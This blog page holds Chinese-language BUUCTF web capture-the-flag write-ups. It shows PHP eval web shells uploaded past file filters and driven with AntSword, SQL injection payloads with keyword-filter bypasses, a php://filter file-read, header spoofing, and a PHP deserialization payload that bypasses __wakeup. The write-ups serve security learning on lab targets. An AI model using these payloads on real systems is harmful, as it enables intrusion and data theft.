<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>qinyiwen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="qinyiwen">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="qinyiwen">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qinyiwen</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Buuctf Web（13-16）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-09T09:14:13.000Z" itemprop="datePublished">2023-08-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/">Buuctf Web（13-16）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（13-16）"><a href="#Buuctf-Web（13-16）" class="headerlink" title="Buuctf Web（13-16）"></a>Buuctf Web（13-16）</h3><h4 id="13、Upload"><a href="#13、Upload" class="headerlink" title="13、Upload"></a>13、Upload</h4><p>创建一个木马文件</p>
<p>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33" alt="image"></p>
<p>上传该文件，显示Not image!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93" alt="image"></p>
<p>抓包，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code>，send，查看文件名后缀应为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155" alt="image"></p>
<p>使用蚁剑</p>
<p>URL地址为：<code>/upload/a.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273" alt="image"></p>
<p>右键单击，文件管理，查看根目录，找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34c3fd89-3b0b-450b-9953-287122b67247&#125;</span><br></pre></td></tr></table></figure>

<h4 id="14、Upload"><a href="#14、Upload" class="headerlink" title="14、Upload"></a>14、Upload</h4><p>上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0" alt="image"></p>
<p>抓包，显示上传成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/394659692a460258b45a99f1424ea357.jpg</code></p>
<p>连接密码为：<code>a</code></p>
<p>尝试一下，测试连接显示返回数据为空</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d" alt="image"></p>
<p>尝试修改后缀名为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功 后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04" alt="image"></p>
<p>右键单击，文件管理</p>
<p>在根目录中找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8337ba06-02fe-47b4-8563-e341d08b19fe&#125;</span><br></pre></td></tr></table></figure>

<h4 id="15、BabySQL"><a href="#15、BabySQL" class="headerlink" title="15、BabySQL"></a>15、BabySQL</h4><p>常规注入：<code>/check.php?username=admin&amp;password=1&#39; union select 1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed301d3e-a195-4d86-abb1-871db2c6eb2c" alt="image"></p>
<p>根据报错信息，猜测union 、select可能被过滤了，试一下双写绕过<br><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d921e6b-5869-498e-a14a-4aa76ccf65b2" alt="image"></p>
<p>URL编码试一下，然后试列数<br>payload：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code>，登录成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4eaa532-463d-46e8-a088-2e411973852d" alt="image"></p>
<p>爆数据库:<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code>，猜测flag在ctf里</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1632ca5e-09f0-4d3e-b47e-b344f49646d8" alt="image"></p>
<p>爆表：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92267bcd-7eb4-4b5d-a41b-88ab75362b1e" alt="image"></p>
<p>查字段名：<code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4876a461-70fe-43cf-b0c5-69b435606532" alt="image"></p>
<p><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b20f762-65b5-42c8-8cad-00ac5910ed6e" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;009a3737-39ae-44ff-8bfb-45287b1e2093&#125;</span><br></pre></td></tr></table></figure>

<h4 id="16、PHP"><a href="#16、PHP" class="headerlink" title="16、PHP"></a>16、PHP</h4><p>题目提示了备份网站</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
<p>使用目录扫描工具 dirsearch</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
<p>可以直接到github上下载压缩包，解压后，进入目录运行cmd</p>
<p>首先安装dirsearch：<code>python setup.py install</code></p>
<p>如果报错，可能是因为pip版本太低，更新pip：<code>python -m pip install --upgrade pip</code></p>
<p>运行，开始扫描：<code>py -3.9 dirsearch.py -u http://15349308-86d1-4f57-8e2c-50b34e5d48eb.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的如下图所示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fcc5c5f4-5fbe-4929-9938-3db7ff70dee8" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1908e07e-39aa-4685-9079-71f36405ed17" alt="image"></p>
<p>访问<a target="_blank" rel="noopener" href="http://www.zip文件,下载了一个压缩包/">www.zip文件，下载了一个压缩包</a></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c166170d-069f-4d99-acb4-e75a2c6ac3fc" alt="image"></p>
<p>解压得到一系列文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9be93ca0-b413-4787-8b29-3115eec2be45" alt="image"></p>
<p>查看index.php文件，发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()</p>
<p>所以页面可以传进一个参数<code>select</code>然后把它反序列化，反序列化的过程中会用到class.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/917331c7-3a19-4c6a-b5b8-2d08ca263360" alt="image"></p>
<p>查看class.php文件，有输出flag的条件</p>
<p>要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed" alt="image"></p>
<p>魔法函数</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在反序列化脚本结束时会自动调用它，它是unserialize()结束的魔术方法（魔法函数）</span><br><span class="line"></span><br><span class="line">魔法函数</span><br><span class="line">通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</span><br><span class="line">__construct 当一个对象创建时自动调用</span><br><span class="line">__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line">__sleep() 使**用serialize()函数时触发</span><br><span class="line">__wakeup 使用unserialse()**函数时会自动调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 用于从不可访问的属性读取数据//调用私有属性时使用</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>构造序列化，php代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &quot;yesyesyes&quot;;</span><br><span class="line">    private $password = &quot;nonono&quot;;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=$username;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(@admin,100);</span><br><span class="line">//var_dump($a);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;//输出序列化</span><br><span class="line">echo urlencode($b);//输出url编码后的序列化</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940" alt="image"></p>
<p>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把Name后面的2改为3或以上即可</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>然后url识别不了”，改为%22</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22Nameusername%22;s:5:%22admin%22;s:14:%22Namepassword%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>因为成员（属性）是private，所以要在类名和成员名前加%00这个url编码是空的意思。因为生产序列化时不会把这个空也输出。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>


<p>完整payload：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6916ddd3-236d-4ee7-9d17-962c0187f537" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1e6c9083-a44b-4c83-9a9c-f865d6230e68&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/" data-id="cll5bk8gt0000e4vfgrzth6zo" data-title="Buuctf Web（13-16）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（9-12）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-08T13:24:46.000Z" itemprop="datePublished">2023-08-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/">Buuctf Web（9-12）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（9-12）"><a href="#Buuctf-Web（9-12）" class="headerlink" title="Buuctf Web（9-12）"></a>Buuctf Web（9-12）</h3><h4 id="9、Secret-File"><a href="#9、Secret-File" class="headerlink" title="9、Secret File"></a>9、Secret File</h4><p>查看源代码，有一个Archive_room.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f92bc8c-c00d-49e5-b321-488e99af3728" alt="image"></p>
<p>查看该文件，有一个按钮</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f52ac5a-eb0a-4597-9639-8eb419803978" alt="image"></p>
<p>点击按钮，没看到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28a170be-68bb-4f90-9875-e7bf863111a0" alt="image"></p>
<p>从按钮处抓包，看到有一个secr3t.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d9d3bb9-5590-4daf-8431-6b327283fc89" alt="image"></p>
<p>查看该文件，flag在flag.php里</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/970159db-f8ad-41b9-9a37-5fc0c5d48a0e" alt="image"></p>
<p>查看该文件，还是没看到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ece77017-09c0-4f2e-9f32-8ec19c9a01af" alt="image"></p>
<p>想到了PHP的封装协议，利用了filter伪协议，该协议刚好就能够查看文件包含的漏洞，所以当我们利用该协议查看flag.php时，会将它的源代码爆出来，但是因为base64的加密原因，所以我们还需要进行一次base64解密</p>
<p>构造payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/164dbeeb-bc18-4496-86b6-5c9324f74dfb" alt="image"></p>
<p>看到一串base64编码，解码后得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/70bf11c6-f0cc-4c1d-912a-73bbfac52ebf" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;657993f7-ec4c-4ccd-a411-1fbca834a5b5&#125;</span><br></pre></td></tr></table></figure>

<h4 id="10、LoveSQL"><a href="#10、LoveSQL" class="headerlink" title="10、LoveSQL"></a>10、LoveSQL</h4><p>尝试万能密码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c41017b4-189d-4bb3-9734-cbe9b67f1176" alt="image"></p>
<p>有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28f501c1-3599-4279-b421-f10026b15978" alt="image"></p>
<p>尝试联合查询，查到3的时候回显正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c732357b-32f9-4208-a8e8-1238c2ddc296" alt="image"></p>
<p>爆数据库password&#x3D;:<code>1&#39; union select 1,2,database()#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e319507-1e47-4c7d-b1c3-513dfe8567dc" alt="image"></p>
<p>爆出数据库名为geek</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ee2e800-9f8e-4e3c-84cd-74cc042130f7" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/46fefaef-3e5b-4e25-879b-fe8d90e6a190" alt="image"></p>
<p>爆出表名为geekuser</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86dda2c-490c-4565-9987-7debf9b563fc" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/91e3ddbc-4172-46a3-bd4a-8475672d22ae" alt="image"></p>
<p>爆出表名为l0ve1ysq1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/48fad51e-7c1d-46c2-a62f-70096f1911b0" alt="image"></p>
<p>爆列名password&#x3D;<code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; #</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d75cf913-a8ff-42bc-a889-2520f7034e8a" alt="image"></p>
<p>id,username,password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4322e73-777f-41f7-a80d-216f16b92262" alt="image"></p>
<p>爆数据：<code>/check.php?username=1&amp;password=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f190d3d-18db-46dd-a153-14c2629ab419" alt="image"></p>
<p>查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/847ee93b-2338-46f3-bd64-75dd2af16945" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7904eee7-45b3-4f8b-8eac-ecab975dac71&#125;</span><br></pre></td></tr></table></figure>

<h4 id="11、Http"><a href="#11、Http" class="headerlink" title="11、Http"></a>11、Http</h4><p>查看页面源代码，发现有个Secret.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fc1e582e-da71-41e3-ae68-398440843c32" alt="image"></p>
<p>查看该文件，有一个网址</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8fae7de-4638-4717-894c-194b9ff5d21d" alt="image"></p>
<p>提示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com’,就是说这个页面得来自https//www.Sycsecret.com%EF%BC%8C%E6%B7%BB%E5%8A%A0referer%E5%8D%B3%E5%8F%AF">https://www.Sycsecret.com’，就是说这个页面得来自https://www.Sycsecret.com，添加referer即可</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer头用于告诉web服务器，用户是从哪个页面找过来的</span><br></pre></td></tr></table></figure>

<p>添加<code>Referer:https://www.Sycsecret.com</code>，send，提示Please use “Syclover” browser：请使用“Syclover”浏览器</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息</span><br></pre></td></tr></table></figure>

<p>添加<code>User-Agent:Syclover</code>，send，提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5" alt="image"></p>
<p>添加<code>X-Forwarded-For:127.0.0.1</code>，send，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43a4b431-f334-44b4-bcb3-aadf626871ac&#125;</span><br></pre></td></tr></table></figure>

<h4 id="12、Knife"><a href="#12、Knife" class="headerlink" title="12、Knife"></a>12、Knife</h4><p>使用蚁剑，安装教程<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367151320">渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)</a></p>
<p>构造payload：<code>/?&lt;?php eval($_POST[&quot;Syc&quot;]);?&gt;</code></p>
<p>打开蚁剑添加数据</p>
<p>URL地址为：<a target="_blank" rel="noopener" href="http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php">http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php</a></p>
<p>密码为：Syc</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd" alt="image"></p>
<p>测试连接，连接成功，再点击添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10" alt="image"></p>
<p>右键单击，选择文件管理</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa" alt="image"></p>
<p>查看根目录，发现有个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52" alt="image"></p>
<p>双击查看，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1248bbb7-c099-4589-a699-63d87c2ec2d3&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" data-id="cll2ftaqf00004gvf6qb62b6u" data-title="Buuctf Web（9-12）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（1-8）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-07T12:38:17.000Z" itemprop="datePublished">2023-08-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/">Buuctf Web（1-8）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（1-8）"><a href="#Buuctf-Web（1-8）" class="headerlink" title="Buuctf Web（1-8）"></a>Buuctf Web（1-8）</h3><h4 id="1、EasySQL"><a href="#1、EasySQL" class="headerlink" title="1、EasySQL"></a>1、EasySQL</h4><p>万能密码</p>
<p>1’or’1’&#x3D;’1</p>
<p>sql语句中#是注释符</p>
<p>select * from table_name where username&#x3D;’1’ or 1&#x3D;1 # ‘ and password&#x3D;’xxxxxx’ ;</p>
<p>相当于</p>
<p>select * from table_name where username&#x3D;’1’ or 1&#x3D;1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a60fa05-3af6-4713-a7e9-5fa7b92293bf" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/296048b4-9808-4596-821e-a3ff1dc0fd1e" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;46247fc5-8cd1-4f68-9601-63d1ccd4d7dc&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、Havefun"><a href="#2、Havefun" class="headerlink" title="2、Havefun"></a>2、Havefun</h4><p>查看源码，看到一串被注释的php代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/baea5f74-f9fe-4944-9b59-6cecb6a75602" alt="image"> </p>
<p>有一个cat变量，通过get方式传参，如果cat&#x3D;dog，输出flag</p>
<p>构造payload：&#x2F;?cat&#x3D;dog</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/44a8bec8-51b5-48ad-a28c-a17e0a0f4a6d" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d6a6ed35-29e7-41db-9a46-170dcb0f9128&#125;</span><br></pre></td></tr></table></figure>

